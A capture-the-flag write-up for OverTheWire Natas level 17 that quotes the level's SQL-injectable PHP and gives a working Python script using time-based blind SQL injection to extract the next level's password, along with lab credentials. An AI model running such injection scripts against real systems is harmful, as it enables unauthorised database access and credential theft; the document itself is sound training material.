# Level 17

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)
- username: `natas17`
- password: `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`

## Solution

![start](./start.jpg)

Let's analyze the sourcecode:

```php
...
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
...
```

So it is pretty much the same as [level 15](https://github.com/bu19akov/CTF-Challenge-Solutions/tree/main/OverTheWire/Natas/level_15) but now we won't get direct response if the user is found or not. It's definitely [Time-Based Blind SQL Injection](https://www.sqlinjection.net/time-based/)! Let's we will modify the script from [level 15](https://github.com/bu19akov/CTF-Challenge-Solutions/tree/main/OverTheWire/Natas/level_15) to cause a delay if the character is correct. This means, that if the character is correctly guessed, we will have to wait `sleep(N)` seconds:  *(`natas18" and IF(password LIKE BINARY "{current_password}%", sleep(3), false) #`)* -> If password is correct, then `sleep` for 3 seconds, else return false:

```py
import requests
import time

# Base URL and endpoint of the target site
url = 'http://natas17.natas.labs.overthewire.org/index.php'

# Characters to test in the password
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Store the successfully found password
found_password = ''

# Threshold time to determine if the character is part of the password
time_threshold = 1  # seconds

# Function to make a POST request and check if the character causes a delay
def check_character(current_password):
    # Payload for POST request, updated with the correct SQL query structure to cause a delay
    payload = f'natas18" and IF(password LIKE BINARY "{current_password}%", sleep(3), false) #'

    headers = {
        'Authorization': 'Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas17.natas.labs.overthewire.org',
        'Referer': 'http://natas17.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Start timing the request
    start_time = time.time()

    # Make the POST request
    response = requests.post(url, headers=headers, data={'username': payload})

    # End timing the request
    end_time = time.time()

    # Calculate the duration of the request
    duration = end_time - start_time
    print(f"Testing '{current_password}' took {duration:.2f} seconds")
    
    # Return true if the response took longer than the threshold
    return duration > time_threshold

# Brute force the password character by character
for i in range(50):  # assuming max 50 characters
    found_this_iteration = False  # Flag to check if we found at least one character in this iteration
    for char in characters:
        test_password = found_password + char
        if check_character(test_password):
            found_password += char
            print(f'Found so far: {found_password}')
            found_this_iteration = True
            break
    if not found_this_iteration:
        print("No further characters found. Ending search.")
        break

print(f'Complete password: {found_password}')
```

## Password

`natas18`:`8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`

*Created by [bu19akov](https://github.com/bu19akov)*